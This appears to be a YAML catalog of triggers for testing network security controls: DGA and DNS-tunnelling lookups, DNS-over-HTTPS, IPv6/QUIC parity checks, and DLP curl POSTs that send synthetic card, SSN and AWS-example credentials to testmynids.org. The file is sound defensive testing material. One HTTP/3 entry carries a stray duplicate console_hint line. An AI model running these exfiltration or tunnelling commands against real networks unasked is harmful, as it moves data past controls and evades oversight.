# ---------------------------------------------------------------------------
# DNS security — DGA, tunnelling, and DNS-over-HTTPS.
#
# DNS is where a lot of C2 and policy signal lives, and it is cheap to inspect. These use
# the built-in stdlib DNS probe (no resolver library), and an NXDOMAIN counts as a
# successful send: the QUESTION crossing the wire is what a DNS signature inspects, so
# whether the name resolves is beside the point.
# ---------------------------------------------------------------------------

- id: ns-dns-dga
  label: "DGA-style domains (algorithmically generated)"
  class: ns-ids
  runner: dns
  commands:
    - ["dns", "kqxwjvbnmzptrhgd.com", "@8.8.8.8"]
    - ["dns", "xzmqvlbtrwnkhdfp.net", "@8.8.8.8"]
    - ["dns", "vbnmqwertzuiopas.biz", "@8.8.8.8"]
  flags: [needs_internet]
  severity: warn
  threat_class: c2
  expected_fire: "ET DNS / DGA heuristics — high-entropy algorithmically generated domain lookups"
  talking_point: "Malware that can't hard-code a C2 address generates thousands of names a day and tries them all. The randomness itself is the signal."
  console_hint: "DNS or threat log — filter by the query names below; expect a DGA or suspicious-domain classification."

- id: ns-dns-tunnel
  label: "DNS tunnelling (long TXT-style labels)"
  class: ns-ids
  runner: dns
  commands:
    - ["dns", "aGVsbG8td29ybGQtdGhpcy1pcy1hLXR1bm5lbC10ZXN0LXBheWxvYWQ.t.example.com", "@8.8.8.8", "type=TXT"]
    - ["dns", "c2Vjdml0YWxzLWRucy10dW5uZWwtdGVzdC1zZWdtZW50LXR3bw.t.example.com", "@8.8.8.8", "type=TXT"]
    - ["dns", "dGhpcmQtc2VnbWVudC1vZi10aGUtc3ludGhldGljLXR1bm5lbA.t.example.com", "@8.8.8.8", "type=NULL"]
  flags: [needs_internet]
  severity: crit
  threat_class: c2
  expected_fire: "ET DNS — DNS tunnelling / exfiltration (long base32-style labels, TXT and NULL queries)"
  talking_point: "Data smuggled inside the query name itself. The giveaway is the shape: long high-entropy labels and TXT/NULL record types, under one parent domain."
  console_hint: "DNS or threat log — filter by the parent domain t.example.com; expect a DNS-tunnelling detection."

- id: ns-doh
  label: "DNS-over-HTTPS (resolver bypass)"
  class: ns-ids
  runner: curl
  commands:
    - ["curl", "-s", "-S", "-o", "{devnull}", "-w", "%{http_code}|", "--connect-timeout", "6", "--max-time", "10", "-H", "accept: application/dns-json", "https://cloudflare-dns.com/dns-query?name=example.com&type=A"]
    - ["curl", "-s", "-S", "-o", "{devnull}", "-w", "%{http_code}|", "--connect-timeout", "6", "--max-time", "10", "-H", "accept: application/dns-json", "https://dns.google/resolve?name=example.com&type=A"]
  flags: [needs_internet]
  severity: warn
  threat_class: policy
  expected_fire: "ET POLICY — DNS over HTTPS (DoH) resolver usage"
  talking_point: "DoH hides DNS inside ordinary HTTPS, taking every DNS control out of the path. Most policies want it denied so resolution stays visible."
  console_hint: "Web filtering log — expect the DoH provider category, or an application-control hit for DNS-over-HTTPS."

# ---------------------------------------------------------------------------
# Protocol-parity twins — IPv6 and HTTP/3 (QUIC).
#
# These exist to find a BLIND SPOT: a control that inspects IPv4/TCP-443 but quietly
# ignores IPv6 or QUIC. They also introduce a specific way to lie, so they are handled
# carefully. `requires:` declares the transport each one needs; if this host has no IPv6
# route, or curl was built without HTTP/3, the trigger reports `error` with a plain
# reason and is NEVER reported as blocked — the app refuses to credit the customer's
# stack with a drop it never made. See unmet_requirement() in secvitals.py.
# ---------------------------------------------------------------------------

- id: ns-uid-v6
  label: "Linux UID over IPv6 (address-family parity)"
  class: ns-ids
  runner: curl
  requires: [ipv6]
  commands:
    - ["curl", "-6", "-s", "-S", "-o", "{devnull}", "-w", "%{http_code}|", "--connect-timeout", "6", "--max-time", "10", "http://testmynids.org/uid/index.html"]
  flags: [needs_internet, needs_et_ruleset]
  severity: warn
  threat_class: recon
  expected_fire: "SID 2100498 over IPv6 — the same signature must fire on the v6 path"
  talking_point: "The identical payload, over IPv6. If it alerts on v4 and not v6, the inspection policy has an address-family blind spot."
  console_hint: "IDS/IPS alert log — filter by the IPv6 5-tuple below; expect the SAME SID as the IPv4 trigger."

- id: web-cat-social-v6
  label: "Social Networking over IPv6 (SWG parity)"
  class: ns-webcc
  runner: curl
  requires: [ipv6]
  commands:
    - ["curl", "-6", "-sS", "-A", "SecVitals-Demo", "-o", "{devnull}", "-w", "%{http_code}|%{size_download}|%{url_effective}", "--connect-timeout", "6", "--max-time", "9", "https://www.facebook.com/"]
  flags: [needs_internet]
  severity: info
  threat_class: policy
  expected_fire: "SWG category Social Networking over IPv6 · Deny → timeout"
  talking_point: "Category filtering has to work the same over IPv6. Plenty of deployments discover here that it doesn't."
  console_hint: "Web filtering log — filter by the IPv6 destination; expect the same category and action as the IPv4 request."

- id: web-cat-social-h3
  label: "Social Networking over HTTP/3 (QUIC parity)"
  class: ns-webcc
  runner: curl
  requires: [http3]
  commands:
    - ["curl", "--http3", "-sS", "-A", "SecVitals-Demo", "-o", "{devnull}", "-w", "%{http_code}|%{size_download}|%{url_effective}", "--connect-timeout", "6", "--max-time", "9", "https://www.facebook.com/"]
  flags: [needs_internet]
  severity: warn
  threat_class: policy
  expected_fire: "SWG category Social Networking over HTTP/3 · Deny → timeout"
  talking_point: "QUIC is UDP/443, not TCP. A gateway that only inspects TCP sees nothing here — which is exactly why browsers reaching QUIC first is a policy problem worth showing."
  console_hint: "Web filtering log — look for a UDP/443 flow. No entry at all is itself the finding."
  console_hint: "IP reputation / threat-intel hits — filter by the destination IPs below; the appliance's own reputation counters are authoritative, not our ratio."

# ---------------------------------------------------------------------------
# DLP / data-exfiltration — content inspection.
#
# Every value below is DELIBERATELY SYNTHETIC and publicly documented as a test value:
# the universal Visa test PAN (4111 1111 1111 1111), an SSN in the 666 area (never
# issued by the SSA), and AWS's own documentation example key. NO REAL DATA IS SENT.
# They POST over cleartext HTTP to the same benign tmNIDS origin the IDS catalog uses,
# so an inline DLP engine sees the pattern WITHOUT needing SSL inspection. (An
# SSL-inspection variant belongs with a self-hosted echo target — see the roadmap.)
#
# Classification is unchanged: a DLP drop shows as curl rc 28/7/56 or HTTP 403/451
# (blocked), a completed POST as allowed, and a DNS/TLS failure as error — never a
# false blocked.
# ---------------------------------------------------------------------------

- id: dlp-pan
  label: "Credit-card data (synthetic test PAN)"
  class: ns-dlp
  runner: curl
  commands:
    - ["curl", "-s", "-S", "-o", "{devnull}", "-w", "%{http_code}|", "--connect-timeout", "6", "--max-time", "10", "-X", "POST", "-H", "Content-Type: application/x-www-form-urlencoded", "-d", "cardholder=Test+Persona&card=4111111111111111&exp=1229&cvv=123", "http://testmynids.org"]
  flags: [needs_internet]
  severity: crit
  threat_class: dlp
  expected_fire: "DLP — credit-card number (PCI) in an outbound HTTP POST body"
  talking_point: "4111 1111 1111 1111 is the universal Visa TEST number — it passes Luhn, so a real DLP engine matches it, but it belongs to no one."
  console_hint: "DLP / content-inspection log — filter by the 5-tuple below; expect a credit-card or PCI data-pattern match."

- id: dlp-ssn
  label: "Personal data (never-issued SSN)"
  class: ns-dlp
  runner: curl
  commands:
    - ["curl", "-s", "-S", "-o", "{devnull}", "-w", "%{http_code}|", "--connect-timeout", "6", "--max-time", "10", "-X", "POST", "-H", "Content-Type: application/x-www-form-urlencoded", "-d", "name=Test+Persona&ssn=666-12-3456&dob=1970-01-01", "http://testmynids.org"]
  flags: [needs_internet]
  severity: crit
  threat_class: dlp
  expected_fire: "DLP — US Social Security Number pattern in an outbound HTTP POST body"
  talking_point: "The 666 area code has never been issued by the SSA, so this matches the PII pattern while identifying no real person."
  console_hint: "DLP / content-inspection log — filter by the 5-tuple below; expect a PII or SSN data-pattern match."

- id: dlp-secrets
  label: "Credentials & keys (documentation example values)"
  class: ns-dlp
  runner: curl
  commands:
    - ["curl", "-s", "-S", "-o", "{devnull}", "-w", "%{http_code}|", "--connect-timeout", "6", "--max-time", "10", "-X", "POST", "-H", "Content-Type: application/x-www-form-urlencoded", "-d", "aws_access_key_id=AKIAIOSFODNN7EXAMPLE&aws_secret_access_key=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY", "http://testmynids.org"]
    - ["curl", "-s", "-S", "-o", "{devnull}", "-w", "%{http_code}|", "--connect-timeout", "6", "--max-time", "10", "-X", "POST", "-H", "Content-Type: text/plain", "-d", "-----BEGIN RSA PRIVATE KEY-----MIIBOgIBAAJBAKj34GkxFhD90vcNLYLInFEX6Ppy1tPf9Cnzj4p4WGeKLs1Pt8Qu-----END RSA PRIVATE KEY-----", "http://testmynids.org"]
  flags: [needs_internet]
  severity: crit
  threat_class: dlp
  expected_fire: "DLP — cloud access key / private-key material in an outbound HTTP POST body"
  talking_point: "AKIAIOSFODNN7EXAMPLE is the key AWS itself uses in its documentation, and the PEM block is truncated filler — recognizable to a secrets matcher, useless to an attacker."
  console_hint: "DLP / content-inspection log — filter by the 5-tuple below; expect a credentials or private-key data-pattern match."
